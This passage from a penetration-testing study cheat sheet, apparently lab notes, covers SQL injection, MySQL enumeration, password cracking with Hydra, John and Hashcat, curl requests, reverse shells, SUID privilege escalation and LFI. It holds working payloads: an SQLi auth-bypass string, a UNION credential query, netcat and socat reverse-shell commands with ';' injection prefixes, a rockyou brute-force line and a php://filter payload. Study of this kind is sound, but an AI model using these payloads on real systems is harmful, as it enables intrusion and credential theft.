<p>For further information see the following documentation: <a href="https://www.offensive-security.com/metasploit-unleashed/msfconsole-commands/">offensive-security.com</a></p>
<h3 data-number="1.7.8" id="sql-injection"><span class="header-section-number">1.7.8</span> SQL injection</h3>
<h4 data-number="1.7.8.1" id="types"><span class="header-section-number">1.7.8.1</span> Types</h4>
<ol type="1">
<li>In-band 1.1 Union Based 1.1 Error Based</li>
<li>Blind 2.1 Boolean Based 2.2 Time Based</li>
<li>Out-of-band</li>
</ol>
<h4 data-number="1.7.8.2" id="sqli-discovery"><span class="header-section-number">1.7.8.2</span> SQLi Discovery</h4>
<table>
<thead>
<tr class="header">
<th>Payload</th>
<th>URL Encoded</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>&#39;</code></td>
<td><code>%27</code></td>
</tr>
<tr class="even">
<td><code>&quot;</code></td>
<td><code>%22</code></td>
</tr>
<tr class="odd">
<td><code>#</code></td>
<td><code>%23</code></td>
</tr>
<tr class="even">
<td><code>;</code></td>
<td><code>%3B</code></td>
</tr>
<tr class="odd">
<td><code>)</code></td>
<td><code>%29</code></td>
</tr>
</tbody>
</table>
<p>If we add one of the above payloads and observe any weird behavior
from the webpage, we can assume that there is a SQL injection
possible.</p>
<p>For example, we can now try an <code>OR Injection</code>.</p>
<div class="sourceCode" id="cb65"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb65-1"><a href="#cb65-1" aria-hidden="true" tabindex="-1"></a>admin<span class="st">&#39; or &#39;</span><span class="dv">1</span><span class="st">&#39;=&#39;</span><span class="dv">1</span></span></code></pre></div>
<p>When there is no hint for a valid username we can repeat this for the
password.</p>
<p>For more Payloads please have a look in the <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">PayloadsAllTheThings
Project</a>.</p>
<h4 data-number="1.7.8.3" id="comments"><span class="header-section-number">1.7.8.3</span> Comments</h4>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>Comment</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>--</code></td>
<td>Inline - Must contain a whitespace after the two dashes!</td>
</tr>
<tr class="even">
<td><code>#</code></td>
<td>Inline - Note correct URL encoding</td>
</tr>
<tr class="odd">
<td><code>/**/</code></td>
<td>Inline - Unusual</td>
</tr>
</tbody>
</table>
<h4 data-number="1.7.8.4" id="union-clause"><span class="header-section-number">1.7.8.4</span> Union Clause</h4>
<p>If we use the union clause it is important that we ensure that the
data type on the selected columns are the same.</p>
<p>It can appear that we query two columns from a table and want to
union it with another single column. In that case, we have to add
another column and fill it with junk. For example <code>NULL</code>,
because it fits all data types.</p>
<div class="sourceCode" id="cb66"><pre class="sourceCode sql"><code class="sourceCode sql"><span id="cb66-1"><a href="#cb66-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">from</span> products <span class="kw">where</span> product_id <span class="op">=</span> <span class="st">&#39;1&#39;</span> <span class="kw">UNION</span> <span class="kw">SELECT</span> username, <span class="dv">2</span> <span class="kw">from</span> passwords</span></code></pre></div>
<h3 data-number="1.7.9" id="mysql"><span class="header-section-number">1.7.9</span> MySQL</h3>
<p>First we need a client, which is in our case
<code>default-mysql-client</code>:</p>
<div class="sourceCode" id="cb67"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb67-1"><a href="#cb67-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> mysql <span class="at">-h</span> [IP] <span class="at">-P</span> [port] <span class="at">-u</span> [username] <span class="at">-p</span></span></code></pre></div>
<pre class="text"><code>*(-h [IP]        = Connect to the MariaDB server on the given host
  -u [username]  = The MariaDB user name to use when connecting to the server
  -P [port]      = The port to use for the connection
  -p             = The password to use when connecting to the server)</code></pre>
<ol type="1">
<li><code>SHOW DATBASES;</code></li>
<li><code>USE &lt;database&gt;;</code></li>
<li><code>SHOW TABLES;</code></li>
<li><code>SELECT * FROM &lt;tablename&gt;;</code></li>
</ol>
<p>If we do not have any credentials we can use <code>Nmap</code> or
<code>Metasplot</code> to gain this information:</p>
<div class="sourceCode" id="cb69"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb69-1"><a href="#cb69-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap <span class="at">--script</span><span class="op">=</span>mysql-enum [target]</span></code></pre></div>
<pre class="text"><code>*(--script=mysql-enum           = Scan with a single script: mysql-enum
  [target]                      = The IP address of the target)</code></pre>
<p>Now that we know some usernames of the database, we can try to crack
the passwords of them with <code>Hydra</code>:</p>
<div class="sourceCode" id="cb71"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb71-1"><a href="#cb71-1" aria-hidden="true" tabindex="-1"></a><span class="ex">hydra</span> <span class="at">-t</span> 16 <span class="at">-l</span> root <span class="at">-P</span> /usr/share/wordlists/rockyou.txt <span class="at">-vV</span> 10.10.6.199 mysql</span></code></pre></div>
<pre class="text"><code>*(-t 16     = Number of parallel connections per target
  -l [user] = Points to the user who&#39;s account you&#39;re trying to compromise
  -P [file] = Points to the file containing the list of possible passwords
  -vV       = Very verbose: shows the login+pass combination for each attempt
  [IP]      = The IP address of the target machine
  [mysql]   = Sets the protocol)</code></pre>
<h3 data-number="1.7.10" id="john-the-ripper"><span class="header-section-number">1.7.10</span> John the Ripper</h3>
<p>If we have a hash which look something like the following
example:</p>
<pre><code>carl:*EA031893AA21444B170FC2162A56978B8CEECE18</code></pre>
<p>We can pipe the hash in a file:</p>
<div class="sourceCode" id="cb74"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb74-1"><a href="#cb74-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> echo carl:<span class="pp">*</span>EA031893AA21444B170FC2162A56978B8CEECE18 <span class="op">&gt;</span> hash.txt</span></code></pre></div>
<p>And crack the password with <code>John the Ripper</code>:</p>
<div class="sourceCode" id="cb75"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb75-1"><a href="#cb75-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john hash.txt</span>
<span id="cb75-2"><a href="#cb75-2" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> john <span class="at">--show</span> <span class="at">--format</span><span class="op">=</span>RAW-MD5 hash.txt</span></code></pre></div>
<pre class="text"><code>*(--show            = show cracked passwords
  --format=&lt;param&gt;  = force hash type: descrypt, bsdicrypt, md5crypt, RAW-MD5, bcrypt, LM, AFS, tripcode, dummy, and crypt</code></pre>
<h3 data-number="1.7.11" id="hashcat"><span class="header-section-number">1.7.11</span> Hashcat</h3>
<pre class="shell"><code>$ hashcat --force -m 500 -a 0 -o found1.txt --remove puthasheshere.hash /usr/share/wordlists/rockyou.txt</code></pre>
<h2 data-number="1.8" id="web-fundamentals"><span class="header-section-number">1.8</span> Web Fundamentals</h2>
<h3 data-number="1.8.1" id="http"><span class="header-section-number">1.8.1</span> HTTP</h3>
<p>There are several headers we can face:</p>
<table>
<colgroup>
<col style="width: 33%" />
<col style="width: 33%" />
<col style="width: 33%" />
</colgroup>
<thead>
<tr class="header">
<th>Header Type</th>
<th>Message Type</th>
<th>Description</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>General Headers</td>
<td>request &amp; response</td>
<td>Describes the message rather than the content</td>
</tr>
<tr class="even">
<td>Entity Headers</td>
<td>request &amp; response</td>
<td>Describes the content</td>
</tr>
<tr class="odd">
<td>Request Headers</td>
<td>request</td>
<td>HTTP requests are messages sent by the client to initiate an action
on the server</td>
</tr>
<tr class="even">
<td>Response Headers</td>
<td>response</td>
<td>HTTP responses are messages sent by a server in response to a
request message</td>
</tr>
<tr class="odd">
<td>Security Headers</td>
<td>response</td>
<td>These define certain policies and rules when accessing a web page,
which the browser must follow</td>
</tr>
</tbody>
</table>
<p>For further information please have a look at <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">Mozilla’s
mdn web docs</a>.</p>
<p>The most commonly used request methods are:</p>
<ul>
<li><code>GET</code></li>
<li><code>POST</code></li>
<li><code>HEAD</code></li>
<li><code>PUT</code></li>
<li><code>DELETE</code></li>
<li><code>OPTIONS</code></li>
<li><code>PATCH</code></li>
</ul>
<h4 data-number="1.8.1.1" id="get-request-1"><span class="header-section-number">1.8.1.1</span> GET Request</h4>
<p>We can gain information about the version of the web server and the
operating system with the curl flag <code>-I</code> which returns us the
<code>http header</code>:</p>
<pre class="shell"><code>$ curl -I &quot;http://${TARGET}&quot;</code></pre>
<pre><code>*(-I  = return HTTP header)</code></pre>
<p>If we face <code>HTTP authentication</code> we can pass our
credentials with one of the following two commands:</p>
<pre class="shell"><code>$ curl -u admin:admin http://${TARGET}
$ curl  http://admin:admin@&lt;SERVER_IP&gt;:&lt;PORT&gt;/ </code></pre>
<pre><code>*(-u  = pass credentials to the server)</code></pre>
<p><code>X-Powered-By header</code> can tell us what the web app is
using. We can see values like PHP, ASP.NET, JSP, etc.</p>
<p><code>Cookies</code> are another value to look at as each technology
by default has its cookies. Some default cookies are:</p>
<ul>
<li>.NET: ASPSESSIONID<RANDOM>=<COOKIE_VALUE></li>
<li>PHP: PHPSESSID=<COOKIE_VALUE></li>
<li>JAVA: JSESSION=<COOKIE_VALUE></li>
</ul>
<p>We have the ability to pass headers with our request with
<code>-H</code>. This can be useful if, for example, we want to provide
an authorization token.</p>
<pre class="shell"><code>$ curl -H &#39;Authorization: Basic YWRtaW46YWRtaW4=&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></pre>
<pre><code>*(-H  = pass a header)</code></pre>
<p>If we want to repeat a request from the browser with
<code>cURL</code>, we can copy (<code>copy -&gt; copy as cURL</code>)
the request as a curl command from the network tab.</p>
<p>It may happen that the server reflects the response to us in a JSON
format. To be able to read it better, we have the possibility to improve
the presentation.</p>
<pre class="shell"><code>$ curl -s http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/le | jq</code></pre>
<pre><code>*(-s  = silent
  jq  = Command-line JSON processor)</code></pre>
<h4 data-number="1.8.1.2" id="post-request-1"><span class="header-section-number">1.8.1.2</span> POST Request</h4>
<p>It mostly appears that we have to log in with a <code>POST</code>
request. In this case we can use command from below.</p>
<pre class="shell"><code>$ curl -L -X POST -d &#39;username=admin&amp;password=admin&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/ -i -v</code></pre>
<pre><code>*(-L  = If the server reports that the requested page  has  moved to a different location  this option will make curl redo the request on  the  new  place
  -X  = the method set with -X, --request overrides the method curl would otherwise select to use
  -d  = HTTP POST data
  -i  = Include protocol response headers in the output
  -v  = verbose)</code></pre>
<p>With a successful authentication, we should gain a cookie from the
<code>Set-Cookie</code> header. For all subsequent requests we can use
this cookie to authenticate us.</p>
<pre class="shell"><code>$ curl -b &#39;PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/</code></pre>
<pre><code>*(-b &lt;data|filename&gt; = Pass the data to the HTTP server in the Cookie header)</code></pre>
<p>In some cases it can appear that we have to use a <code>JSON</code>
format</p>
<pre class="shell"><code>$ curl -X POST -d &#39;{&quot;search&quot;:&quot;london&quot;}&#39; -b &#39;PHPSESSID=c1nsa6op7vtk7kdis7bcnbadf1&#39; -H &#39;Content-Type: application/json&#39; http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/search.php</code></pre>
<pre><code>*(-X  = the method set with -X, --request overrides the method curl would otherwise select to use
  -d  = HTTP POST data
  -b &lt;data|filename&gt; = Pass the data to the HTTP server in the Cookie header
  -H  = pass a header)</code></pre>
<h4 data-number="1.8.1.3" id="put-request"><span class="header-section-number">1.8.1.3</span> PUT Request</h4>
<p>The <code>PUT</code> request looks very similar to the
<code>POST</code> request and can be used to modify information on a
source.</p>
<pre class="shell"><code>$ curl -X PUT http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/london -d &#39;{&quot;city_name&quot;:&quot;New_HTB_City&quot;, &quot;country_name&quot;:&quot;HTB&quot;}&#39; -H &#39;Content-Type: application/json&#39;</code></pre>
<pre><code>*(-X  = the method set with -X, --request overrides the method curl would otherwise select to use
  -d  = HTTP POST data
  -H  = pass a header)</code></pre>
<h4 data-number="1.8.1.4" id="delete-request"><span class="header-section-number">1.8.1.4</span> DELETE Request</h4>
<p>To delete information we can use the <code>DELETE</code> request.</p>
<pre class="shell"><code>$ curl -X DELETE http://&lt;SERVER_IP&gt;:&lt;PORT&gt;/api.php/city/New_HTB_City&#39;</code></pre>
<pre><code>*(-X  = the method set with -X, --request overrides the method curl would otherwise select to use)</code></pre>
<h3 data-number="1.8.2" id="curl"><span class="header-section-number">1.8.2</span> Curl</h3>
<p>If we want to get sources of a webpage, we can do this with
<code>Curl</code>:</p>
<pre class="shell"><code>$ curl -X GET http://10.10.4.59:8081/ctf/post.html</code></pre>
<pre class="text"><code>*(-X [GET]          = Set kind of fetch method
  [target]          = The URL of the webpage we want to fetch
  -d [param]        = Sends the specified data in a POST  request  to  the HTTP server)</code></pre>
<p>We can also save files with the <code>-0</code> flag:</p>
<div class="sourceCode" id="cb98"><pre class="sourceCode bash"><code class="sourceCode bash"><span id="cb98-1"><a href="#cb98-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> curl <span class="at">-O</span> inlanefreight.com/index.html <span class="at">-o</span> home.html <span class="at">-s</span> <span class="at">-v</span></span></code></pre></div>
<pre class="text"><code>*(-0    = Save the output into a file
  -o    = Sepcify the filename
  -s    = Silent the status
  -v    = verbose)</code></pre>
<p>To retrieve an even more verbose output use the <code>-vvv</code>
flag. The certificate check can be skipped with the <code>-k</code>
flag, when establish a <code>https</code> connection via curl.</p>
<p><code>CEWL</code> password list generator.</p>
<p><code>WPSCAN</code> scans the Word Press version.</p>
<p><code>Gobuster</code> is a tool used to brute-force URIs including
directories and files as well as DNS subdomains.</p>
<p><code>DIRB</code> is a Web Content Scanner. It looks for existing
(and/or hidden) Web Objects.</p>
<h3 data-number="1.8.3" id="web-applications"><span class="header-section-number">1.8.3</span> Web Applications</h3>
<p><a href="https://github.com/OWASP/wstg/tree/master/document/4-Web_Application_Security_Testing">OWASP
Web Security Testing Guide</a></p>
<p>Exploit databases:</p>
<ul>
<li>(Exploit DB)[https://www.exploit-db.com/]</li>
<li>(Rapid7 DB)[https://www.rapid7.com/db/]</li>
<li>(Vulnerability Lab)[https://www.vulnerability-lab.com/] ### Reverse
Shell</li>
</ul>
<h4 data-number="1.8.3.1" id="netcat"><span class="header-section-number">1.8.3.1</span> Netcat</h4>
<p>Listener:</p>
<pre class="shell"><code>$ nc -lvnp 4242</code></pre>
<p>Victim:</p>
<pre class="shell"><code>$ ;nc -e /bin/sh 10.0.0.1 4242</code></pre>
<h4 data-number="1.8.3.2" id="socat"><span class="header-section-number">1.8.3.2</span> Socat</h4>
<p>Lister:</p>
<pre class="shell"><code>$ socat -d -d TCP4-LISTEN:4443 STDOUT</code></pre>
<p>Victim (Linux):</p>
<pre class="shell"><code>$ ;socat TCP4:10.0.0.1:4443 EXEC:/bin/bash</code></pre>
<p>Victim (Windows):</p>
<pre class="shell"><code>$ ;socat TCP4:192.168.168.1:4443 EXEC:&#39;cmd.exe&#39;,pipes</code></pre>
<h4 data-number="1.8.3.3" id="stabilize-shell"><span class="header-section-number">1.8.3.3</span> Stabilize Shell</h4>
<p>You can stabilize the shell with the python module
<code>pty</code>:</p>
<div class="sourceCode" id="cb105"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb105-1"><a href="#cb105-1" aria-hidden="true" tabindex="-1"></a>python <span class="op">-</span>c <span class="st">&#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></span></code></pre></div>
<p>For more information checkout the following GitHub repo: <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">PayloadsAllTheThings</a></p>
<p>If you gain access depending on the OS you can try the following
commands to get more information: &gt;Linux</p>
<pre class="shell"><code>  $ whoami
  $ id
  $ ifconfig/ip addr
  $ uname -a                  # print system information
  $ ps -ef                    # -e = select all processes  -f = do full-format listing
  $ less /etc/passwd          # usernames with UID, GID, GECOS, home directory and login shell
  $ cut -d: -f1 /etc/passwd   # only usernames
  $ cat /etc/os-release       # Get inforamtion about the OS and the OS version</code></pre>
<blockquote>
<p>Windows</p>
</blockquote>
<pre class="shell"><code>  $ whoami
  $ ver
  $ ipconfig
  $ tasklist
  $ netstat -an</code></pre>
<h3 data-number="1.8.4" id="privilege-escalation"><span class="header-section-number">1.8.4</span> Privilege Escalation</h3>
<h4 data-number="1.8.4.1" id="exploiting-suid"><span class="header-section-number">1.8.4.1</span> Exploiting SUID</h4>
<pre class="shell"><code>find / -perm /4000 2&gt;/dev/null</code></pre>
<pre class="shell"><code>sudo chmod +s bash</code></pre>
<h2 data-number="1.9" id="sql-injection-sqli"><span class="header-section-number">1.9</span> SQL injection (SQLi)</h2>
<h3 data-number="1.9.1" id="mysql-basics"><span class="header-section-number">1.9.1</span> MySQL Basics</h3>
<p>To interact with MySQL/MariaDB we can use the <code>mysql</code>
binary.</p>
<pre class="shell"><code>$ mysql -u root -h docker.hackthebox.eu -P 3306 -p 

Enter password: 
...SNIP...

mysql&gt; </code></pre>
<pre class="text"><code>*(-u    = User
  -h    = Host
  -P    = Port
  -p    = Password)</code></pre>
<h4 data-number="1.9.1.1" id="operators-1"><span class="header-section-number">1.9.1.1</span> Operators</h4>
<ul>
<li>Division (<code>/</code>), Multiplication (<code>*</code>), and
Modulus (<code>%</code>)</li>
<li>Addition (<code>+</code>) and subtraction (<code>-</code>)</li>
<li>Comparison (<code>=</code>, <code>&gt;</code>, <code>&lt;</code>,
<code>&lt;=</code>, <code>&gt;=</code>, <code>!=</code>,
<code>LIKE</code>)</li>
<li>NOT (<code>!</code>)</li>
<li>AND (<code>&amp;&amp;</code>)</li>
<li>OR (<code>||</code>)</li>
</ul>
<p>For an overview please have a look at the (MySQL
cheatsheet)[https://devhints.io/mysql]. ## LFI</p>
<pre><code>entry=php://filter/convert.base64-encode/resource=index.php</code></pre>
</body>
</html>
